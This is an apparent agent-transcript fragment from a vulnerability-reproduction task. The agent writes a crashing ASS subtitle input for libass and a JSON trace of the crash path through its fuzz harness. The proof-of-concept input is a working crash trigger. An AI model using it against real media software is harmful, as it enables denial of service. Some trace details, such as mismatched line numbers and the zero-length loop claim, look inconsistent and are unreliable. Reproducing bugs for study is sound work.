message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
from json import dumps
poc = Path('/workspace/poc.bin')
poc.write_text('[Script Info]\nTitle: x\nScriptType: v4.00+\nPlayResX: 1280\nPlayResY: 720\n[V4+ Styles]\nFormat: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding\nStyle: Default,Arial,20,&H00FFFFFF,&H000000FF,&H00000000,&H64000000,0,0,0,0,100,100,0,0,1,2,0,2,10,10,10,1\n[Events]\nFormat: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\nDialogue: 0,0:00:00.00,0:00:01.00,Default,,0,0,0,,{\\clip()}\n')
trace=[
  {"step":1,"file":"src-vul/libass_fuzzer.cc","function":"LLVMFuzzerTestOneInput","line":39,"var":"data/size","code":"ASS_Track *track = ass_read_memory(ass_library, (char *)data, size, nullptr);","note":"The fuzz input is parsed as an ASS subtitle document."},
  {"step":2,"file":"src-vul/libass/ass.c","function":"ass_read_memory","line":1342,"var":"newbuf","code":"memcpy(newbuf, buf, bufsize); newbuf[bufsize] = '\\0';","note":"The attacker-controlled bytes are copied into a NUL-terminated buffer."},
  {"step":3,"file":"src-vul/libass/ass.c","function":"ass_read_memory","line":1346,"var":"track","code":"track = parse_memory(library, buf);","note":"The subtitle parser produces track and event structures from the input."},
  {"step":4,"file":"src-vul/libass/ass_render.c","function":"blend_vector_clip","line":1305,"var":"render_priv->state.clip_drawing_text","code":"if (!render_priv->state.clip_drawing_text.str) return;","note":"A clip drawing override can populate an empty drawing string view that is still stored for later use."},
  {"step":5,"file":"src-vul/libass/ass_render.c","function":"blend_vector_clip","line":669,"var":"ol_key.u.drawing.text","code":"ol_key.u.drawing.text = render_priv->state.clip_drawing_text;","note":"The clip drawing string view is copied into an outline cache key used for hashing."},
  {"step":6,"file":"src-vul/libass/libass/ass_cache_template.h","function":"<global>","line":41,"var":"p->member.str / p->member.len","code":"hval = fnv_32a_buf(p->member.str, p->member.len, hval);","note":"The cache hash helper forwards a zero-length string view to the FNV routine."},
  {"step":7,"file":"src-vul/libass/libass/ass_utils.h","function":"<global>","line":186,"var":"len == 0","code":"static inline uint32_t fnv_32a_buf(const void *buf, size_t len, uint32_t hval)","note":"The hash helper does not guard len=0, so its loop dereferences buf even for an empty string, triggering the crash."}
]
Path('/workspace/candidate_trace.json').write_text(dumps(trace))
PY
cat /workspace/candidate_trace.json
